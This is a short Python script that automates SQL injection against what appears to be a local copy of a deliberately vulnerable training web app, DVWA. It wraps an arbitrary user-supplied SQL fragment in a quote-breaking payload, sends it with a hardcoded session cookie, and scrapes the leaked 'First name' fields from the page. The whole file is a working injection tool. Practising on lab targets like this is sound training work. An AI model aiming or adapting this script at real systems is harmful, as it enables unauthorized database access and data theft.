#!/usr/bin/python3

import requests
from bs4 import BeautifulSoup as soupy
import argparse
import urllib
import re

parser = argparse.ArgumentParser()
parser.add_argument('--query', '-q', help='sql query for the injection')
args = parser.parse_args()

query = args.query


def sqlinj(query):
    return f"' and 1=1 {query} -- -"


h = {'security': 'low', 'PHPSESSID': '66h1crsegmql9973v9teur7q45'}

payload = {'id': sqlinj(query), 'Submit': 'Submit'}

url = f"http://localhost/vulnerabilities/sqli/?{urllib.parse.urlencode(payload)}#"
print(url)

r = requests.get(url, cookies=h)

soup = soupy(r.text, features='html.parser')
a = soup.find_all('pre')
for i in a:
    filter = re.findall(r'First name: (.*)<br/>', str(i))[0]
    print(filter)
